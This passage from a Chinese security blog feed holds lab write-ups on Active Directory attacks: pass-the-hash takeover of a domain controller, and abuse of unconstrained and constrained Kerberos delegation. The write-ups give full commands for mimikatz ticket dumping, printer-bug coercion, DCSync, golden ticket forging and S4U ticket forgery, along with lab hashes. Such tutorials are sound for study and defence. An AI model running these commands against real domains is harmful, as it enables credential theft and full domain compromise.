exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929185431206.png" alt="image-20230929185431206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.9.26 -u administrator -H2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><span class="line"></span><br><span class="line">//ntlm的pth攻击</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929185650939.png" alt="image-20230929185650939"></p><p>接下来到域控这台主机了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes 00000000000000000000000000000000:2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7</span><br></pre></td></tr></table></figure><p>//hash值的话就是我们前面获取的那个  然后在前面补0就行了</p><p><img src="../images/image-20230929190925467.png" alt="image-20230929190925467"></p><p>成功拿下这台域控</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;拿到ip后还是先使用fscan进行扫描&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;t</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-约束委派与非约束委派</title>
    <link href="https://ke1nys.github.io/posts/bf224af2.html"/>
    <id>https://ke1nys.github.io/posts/bf224af2.html</id>
    <published>2023-09-29T08:00:26.000Z</published>
    <updated>2023-09-30T09:46:47.731Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7083788949482635271#heading-7">参考文章1</a>  <a href="https://xz.aliyun.com/t/7217#toc-9">参考文章—xz社区</a></p><p>这个是在打春秋云镜的Certify的靶机的时候遇到的知识点  上一篇是写了RBCD  现在的话把其他两个补齐</p><p><strong>(这里的话复现的话就直接搬别人的截图了  这里就不搭建环境复现了)</strong></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这里的话  怎么发现约束委派和非约束委派的用户和计算机就不写了</p><p>就写利用方式</p><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><ul><li><p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code></p></li><li><p>当服务账号或者主机被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<code>msDS-AllowedToDelegateTo</code>属性会包含被约束的服务</p></li></ul><p>发现域中委派的用户或计算机一般使用的手段是通过<code>LDAP</code>协议（全称：<code>LightweightDirectory Access Protocol</code>）然后通过<code>userAccountControl</code>属性筛选出符合的用户或计算机，我们可以通过<code>ADSI</code>（全称：<code>ActiveDirectory Service Interfaces Editor</code>）来编辑和修改LDAP，<code>adsiedit.msc</code>可以打开<code>ADSI</code>编辑器，打开之后我们找到一个设置了非约束委派的用户，可以看到<code>userAccountControl</code>属性包含了<code>TRUSTED_FOR_DELEGATION</code></p><p><img src="../images/image-20230930153644543.png" alt="image-20230930153644543"></p><p>然后我们再看一下约束委派的用户，同样它的<code>userAccountControl</code>属性包含了<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，但是它比非约束委派的用户多了一个<code>msDS-AllowedToDelegateTo</code>属性，里面包含了允许委派的服务</p><p><img src="../images/image-20230930153759579.png" alt="image-20230930153759579"></p><blockquote><p>注意 ： 委派的用户只能是————————-主机用户和服务用户</p></blockquote><h2 id="为什么需要域委派"><a href="#为什么需要域委派" class="headerlink" title="为什么需要域委派"></a>为什么需要域委派</h2><p>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br> 用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。</p><h2 id="域委派流程"><a href="#域委派流程" class="headerlink" title="域委派流程"></a>域委派流程</h2><p><img src="../images/fc96bf11139c4826a7b810c44799622btplv-k3u1fbpfcp-zoom-in-crop-mark1512000.awebp" alt="img"></p><p> 一个域内普通用户jack通过Kerberos协议认证到前台WEB服务后，前台运行 WEB服务的服务账号websvc模拟(Impersonate)用户 jack，以Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中单跳或者多跳的Kerberos认证。</p><ul><li><p>域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器;</p></li><li><p>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请;</p></li><li><p>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据 TGT;</p></li><li><p>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据ST;</p></li><li><p>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据 ST;</p></li><li><p>websvc收到的jack用户的授权票据ST后，可访问文件服务，完成多跳认证。</p></li></ul><h2 id="委派类型"><a href="#委派类型" class="headerlink" title="委派类型"></a>委派类型</h2><p>一是<strong>非约束性委派(Unconstrained Delegation)</strong> ，服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户<strong>访问<code>任意服务</code></strong></p><p>二是<strong>约束性委派(Constrained Delegation)</strong> ，即Kerberos的扩展协议 <code>S4U2Proxy</code>，服务账号只能获取某用户的ST，从而只能模拟用户<strong>访问特定的服务</strong></p><h2 id="非约束委派的利用"><a href="#非约束委派的利用" class="headerlink" title="非约束委派的利用"></a>非约束委派的利用</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p><p>非约束委派的请求过程（图来自微软手册）：</p><p><img src="../images/image-20230930155439169.png" alt="image-20230930155439169"></p><p>上图的Kerberos请求描述分为如下步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1. 用户向`KDC`发送`KRB_AS_REQ`消息请求可转发的`TGT1`。</span><br><span class="line"></span><br><span class="line">2. KDC在`KRB_AS_REP`消息中返回`TGT1`。</span><br><span class="line"></span><br><span class="line">3. 用户根据步骤2中的TGT1请求转发TGT2。</span><br><span class="line"></span><br><span class="line">4. KDC在KRB_TGS_REP消息中为user返回TGT2。</span><br><span class="line"></span><br><span class="line">5. 用户使用步骤2中返回的TGT1向KDC请求Service1的ST（Service Ticket）</span><br><span class="line"></span><br><span class="line">6. TGS在KRB_TGS_REP消息中返回给用户service1的ST。</span><br><span class="line"></span><br><span class="line">7. 用户发送KRB_AP_REQ消息请求Service1，KRB_AP_REQ消息中包含了TGT1和Service1的ST、TGT2、TGT2的SessionKey</span><br><span class="line"></span><br><span class="line">8. service1使用用户发送过来的的TGT2，并以KRB_TGS_REQ的形式将其发送到KDC，以用户的名义请求service2的ST。</span><br><span class="line"></span><br><span class="line">9. KDC在KRB_TGS_REP消息中返回service2到service1的ST，以及service1可以使用的sessionkey。ST将客户端标识为用户，而不是service1。</span><br><span class="line"></span><br><span class="line">10. service1通过KRB_AP_REQ以用户的名义向service2发出请求。</span><br><span class="line"></span><br><span class="line">11. service2响应service1的请求。</span><br><span class="line"></span><br><span class="line">12. 有了这个响应，service1就可以在步骤7中响应用户的请求。</span><br><span class="line"></span><br><span class="line">13. 这里的TGT转发委派机制没有限制service1使用的TGT2是来自哪个服务，所以service1可以以用户的名义向KDC索要任何其他服务的票证。</span><br><span class="line"></span><br><span class="line">14. KDC返回步骤13中请求的ST</span><br><span class="line"></span><br><span class="line">15-16. service1以用户的名义来请求其它服务</span><br></pre></td></tr></table></figure><p><strong>注</strong>：<code>TGT1（forwardable TGT）</code>用于访问<code>Service1</code>，<code>TGT2（forwarded TGT）</code>用于访问<code>Service2</code></p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域控：windows server 2008R2，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li><li>域内主机：windows server 2008R2，主机名：<code>DM2008</code>，IP：<code>192.168.141.183</code>，用户：<code>qiyou</code></li></ul><p><strong>注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p><p>现在我们将<code>DM2008</code>这个主机用户设置为非约束委派</p><p><img src="../images/image-20230930155737452.png" alt="image-20230930155737452"></p><p>然后我们以<code>administrator</code>的身份通过<code>WinRM</code>服务远程连接<code>DM2008</code></p><p><strong>注</strong>：常见的连接方式还有：MSSQL和IIS，不过我们这里为了方便演示就直接用WinRM了</p><p><img src="../images/image-20230930155754988.png" alt="image-20230930155754988"></p><p>这个时候域管理员的TGT已经缓存在<code>DM2008</code>了，我们用mimikatz即可dump出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930155920433.png" alt="image-20230930155920433"></p><p>可以看到<code>[0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</code>即为域管理<code>administrator</code>的TGT</p><p>此时我们访问域控是被拒绝的</p><p><img src="../images/image-20230930155938080.png" alt="image-20230930155938080"></p><p>然后通过ptt将TGT注入到当前会话中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p>成功访问</p><p><img src="../images/image-20230930160007761.png" alt="image-20230930160007761"></p><p><strong>注意</strong>：访问域控要用主机名或者是<code>FQDN</code>，使用IP还是会提示<code>拒绝访问</code></p><p><img src="../images/image-20230930160032710.png" alt="image-20230930160032710"></p><p><strong>这里将域管理员的TGT票据注入到本机内存中后  那么我们就拥有了域管理员的权限了</strong></p><p>如果想执行命令的话，我们可以用<code>WinRM</code>服务来远程连接域控服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName WIN-QFPHJSM1L7G</span><br></pre></td></tr></table></figure><ul><li><code>-ComputerName</code>指定主机名</li><li>如果你WinRM服务端口改了的话，可以用<code>-Port</code>指定<code>WinRM</code>端口，默认是<code>5985</code></li></ul><p><img src="../images/image-20230930160204322.png" alt="image-20230930160204322"></p><p><strong>注</strong>：<code>Windows Server 2012</code>及以上默认是开启WinRM服务的，<code>Windows Server 2008 R2</code>需要<code>winrm quickconfig -q</code>来启动<code>WinRM</code>服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的。<strong>(这里的话是给被控主机开启这个WinRM服务)</strong></p><h3 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h3><p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。</p><p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是<code>tifkin_</code>，<code>enigma0x3</code>和<code>harmj0y</code>在<code>DerbyCon 2018</code>提出的</p><p>演讲PPT：<a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">地址</a></p><p>利用原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p><p><strong>(这里的话重点看利用原理就行了    简单易懂)</strong></p><p><strong>注</strong>：<code>Print Spooler</code>服务默认是自动运行的</p><p><img src="../images/image-20230930161150298.png" alt="image-20230930161150298"></p><p><strong>(用自己电脑搜索就行了  是可以看到是默认开启的)</strong></p><p>操作环境：</p><ul><li>域：<code>test.local</code></li><li>域控：系统：<code>Windows server 2012R2</code>主机名：<code>DM2012</code>，ip：<code>192.168.141.134</code></li><li>域内主机：系统：<code>windows 10</code>，主机名：<code>win10</code>，ip：<code>192.168.141.165</code></li></ul><p>这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限</p><p>我们给win10这个主机账户开启非约束委派</p><p><img src="../images/image-20230930161254235.png" alt="image-20230930161254235"></p><p><strong>注</strong>：是主机账户开启非约束委派，而不是服务用户</p><p><code>tifkin_</code>在他的github上开源了POC：<a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p><p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe dm2012 win10</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930161332611.png" alt="image-20230930161332611"></p><p>然后使用mimikatz.exe导出域管理员的TGT票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>可以发现成功导出来自<code>DM2012$</code>的TGT</p><p><img src="../images/image-20230930161430370.png" alt="image-20230930161430370"></p><p>得到TGT之后，我们用ptt将票据注入到当前会话后，可以用<code>dcsync</code>导出域控中所有用户的hash，然后用<code>krbtgt</code>用户的hash生成黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:test.local /all /csv</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930161514487.png" alt="image-20230930161514487"></p><p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt</span><br></pre></td></tr></table></figure><p>成功以administrator的身份访问域控</p><p><img src="../images/image-20230930161630690.png" alt="image-20230930161630690"></p><p>执行命令可以用<code>WinRM</code>服务来远程连接域控</p><h2 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，对Kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p><p><strong>约束委派（Constrained Delegation）即 Kerberos 的扩展协议 S4U2Proxy，服务账号只能获取某用户的 TGS ，从而只能模拟用户访问特定的服务，这也相对应非约束委派更安全一些。</strong></p><ul><li><code>S4U2self</code> (Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个<strong>服务账户</strong>的 userAccountControl 标志为 <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, 则其可以<strong>代表任何其他用户</strong>获取自身服务的 TGS/ST。</li><li><code>S4U2proxy</code>(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以<strong>代表任何用户</strong>获取在 <code>msDS-AllowedToDelegateTo</code> 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。</li></ul><p><strong>S4U2self</strong>：</p><p>(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</p><p>(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</p><p>(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。</p><p>(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。</p><p>尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。</p><p><strong>S4U2proxy</strong>:</p><p>(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。</p><p>(6) service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。</p><p>(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。</p><p>(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。</p><p>(9) service2 响应步骤 8 的请求。</p><p>(10) service1 响应用户对步骤 5 中的请求。</p><p><strong>总结</strong></p><p>其实约束委派就是限制了<strong>S4U2proxy</strong> 这一部分  就是只能获取到用户访问服务的ST  不能获取到用户的TGT了</p><h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li><li>域内主机：<code>DM08</code></li></ul><p><code>DM08</code>是域内的另外一台主机，下面我们设置了服务用户<code>qiyou</code>对<code>DM08</code>的<code>cifs</code>服务的委派</p><p><img src="../images/image-20230930170007987.png" alt="image-20230930170007987"></p><p>概述那里我们讲了在约束委派的情况下，服务用户只能获取某个用户（或主机）的服务的ST，所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者<code>NTLM Hash</code>，我们就可以伪造S4U请求，进而伪装成服务用户以<strong>任意账户</strong>的权限申请访问某服务的ST</p><p><strong>简单点讲 </strong></p><blockquote><p>就是因为约束委派是不能使用<strong>S4U2proxy</strong>的   那么服务账户就只能获取到用户的ST  那么如果我们获取到了服务账户的密码或者ntlm的hash值  那么我们就可以进行ST的伪造 从而访问自己想要访问的服务</p></blockquote><p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure><p><code>/user</code>: 服务用户的用户名</p><p><code>/password</code>: 服务用户的明文密码</p><p><code>/domain</code>: 所在域名</p><p><code>/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略</p><p><img src="../images/image-20230930171523675.png" alt="image-20230930171523675"></p><p>得到服务用户TGT：<code>TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi</code></p><p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>dm08 CIFS</code>的ST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><strong>这里能伪造成功是因为这个服务账户的TGT是能访问这个cifs服务  然后我们使用他骗过了域管  然后成功伪造了ST</strong></p><p><strong>(能成功伪造这个域管用户Administrator成功的原因是因为这个KDC验证的话是只查找该用户是否存在   并不会判断其身份的可靠性)</strong></p><p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的dm08 CIFS服务的ST2会保存在当前目录下</p><p>然后我们用mimikatz将ST2导入当前会话即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p>成功访问到dm08的cifs服务</p><p><img src="../images/image-20230930172217655.png" alt="image-20230930172217655"></p><p>上面是知道服务用户明文的情况下，kekeo同样也支持使用<code>NTLM Hash</code></p><p>在请求服务用户的TGT那步直接把<code>/password</code>改成<code>/NTLM</code>即可</p><p>已知我们服务账号<code>qiyou</code>的<code>NTLM hash</code>是<code>b4f27a13d0f78d5ad83750095ef2d8ec</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930172252504.png" alt="image-20230930172252504"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930172318778.png" alt="image-20230930172318778"></p><p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code>mimikatz</code>直接从内存中把服务用户的TGT dump出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173327785.png" alt="image-20230930173327785"></p><p><strong>注</strong>：<code>sekurlsa::tickets</code>是列出和导出所有会话的<code>Kerberos</code>票据，<code>sekurlsa::tickets</code>和<code>kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code>sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code>sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p><p>既然服务用户的TGT导出来了，我们就跳过<code>tgt::ask</code>请求TGT这步，直接<code>tgs::s4u</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;196b1e4]-2-0-60a00000-qiyou@krbtgt-QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173522455.png" alt="image-20230930173522455"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173538750.png" alt="image-20230930173538750"></p><h3 id="利用约束委派生成黄金票据"><a href="#利用约束委派生成黄金票据" class="headerlink" title="利用约束委派生成黄金票据"></a>利用约束委派生成黄金票据</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域控：<code>windows server 2008R2</code>，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li><li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li></ul><p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p><p><strong>注</strong>：<code>TGS</code>默认的spn是<code>krbtgt/domain name</code>，我们操作环境是<code>krbtgt/QIYOU.COM</code></p><p><code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p><p>我们可以使用powershell来添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser qiyou</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/qiyou.com&quot;) &#125;</span><br></pre></td></tr></table></figure><p>我们可以用<code>impacket</code>系列的<code>getST</code>向KDC请求administrator的TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.141.145 -spn krbtgt/qiyou.com -impersonate Administrator qiyou.com/qiyou:password</span><br></pre></td></tr></table></figure><p><strong>(解释一下这里的这样干的原因  因为我们添加了服务账户  并且这个服务账户时约束这个krbtgt服务的   然后我们就有了访问这个服务的权限  并且因为这个服务是可以用来生成TGT的  所以我们就可以成功伪造 )</strong></p><p>-impersonate：表示伪造用户</p><p>-spn：表示我们要委派的服务的spn，这里是TGS</p><p>-dc-ip：域控ip</p><p>执行之后会在当前目录生成一个缓存文件<code>Administrator.ccache</code></p><p><img src="../images/image-20230930174306259.png" alt="image-20230930174306259"></p><p>然后用mimikatz进行<code>ptc</code>（pass the cache），将缓存注入当前会话中</p><p><img src="../images/image-20230930174333936.png" alt="image-20230930174333936"></p><p>klist查看缓存的票据</p><p><img src="../images/image-20230930174346596.png" alt="image-20230930174346596"></p><p>访问域控</p><p><img src="../images/image-20230930174409252.png" alt="image-20230930174409252"></p><p>执行命令的话我们可以用<code>impacket</code>系列或者<code>powershell</code>都可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -no-pass -k administrator@WIN-QFPHJSM1L7G.qiyou.com -dc-ip 192.168.141.145</span><br><span class="line"></span><br><span class="line">pth攻击其实也行  先dump出hash  然后再打</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/7083788949482635271#heading-7&quot;&gt;参考文章1&lt;/a&gt;  &lt;a href=&quot;https://xz.aliyun.com/t/7217#toc-9&quot;&gt;参考文章—xz社区&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-基于资源的约束委派利用</title>
    <link href="https://ke1nys.github.io/posts/58c4c9ce.html"/>
    <id>https://ke1nys.github.io/posts/58c4c9ce.html</id>
    <published>2023-09-27T02:46:49.000Z</published>
    <updated>2023-09-27T11:58:24.890Z</updated>
    
